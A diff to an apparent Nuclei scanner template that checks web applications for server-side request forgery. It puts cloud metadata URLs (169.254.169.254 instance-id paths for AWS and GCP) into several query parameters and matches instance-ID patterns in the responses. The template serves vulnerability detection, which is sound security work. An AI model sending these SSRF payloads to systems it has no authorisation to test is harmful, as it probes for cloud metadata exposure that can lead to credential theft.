@@ -7,19 +7,15 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    payloads:
-      cloud_metadata:
-        - "http://169.254.169.254/computeMetadata/v1/instance/id"
-        - "http://169.254.169.254/latest/meta-data/instance-id"
+      - "{{BaseURL}}?url=http://169.254.169.254/computeMetadata/v1/instance/id"
+      - "{{BaseURL}}?dest=http://169.254.169.254/latest/meta-data/instance-id"
+      - "{{BaseURL}}?uri=http://169.254.169.254/latest/meta-data/instance-id"
+      - "{{BaseURL}}?path=http://169.254.169.254/computeMetadata/v1/instance/id"
 
-    fuzzing:
-      - part: query
-        type: replace
-        mode: multiple
-        fuzz:
-          - "{{cloud_metadata}}"
+    headers:
+      Metadata-Flavor: "Google"
 
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: status
@@ -29,16 +25,9 @@ http:
       - type: regex
         part: body
         regex:
-          - "i-[a-f0-9]{17}" # AWS Instance ID
-          - "^[0-9]{15,25}$" # GCP Instance ID
+          - "i-[a-f0-9]{17}" # AWS
+          - "^[0-9]{15,25}$" # GCP
         condition: or
-
-      - type: word
-        part: header
-        negative: true
-        words:
-          - "Cloudflare"
-          - "Server: Akamai"
 
       - type: word
         part: body
@@ -46,10 +35,7 @@ http:
         words:
           - "Forbidden"
           - "Access Denied"
-          - "403"
-          - "404"
-          - "example"
-          - "placeholder"
+          - "Cloudflare"
 
     extractors:
       - type: regex
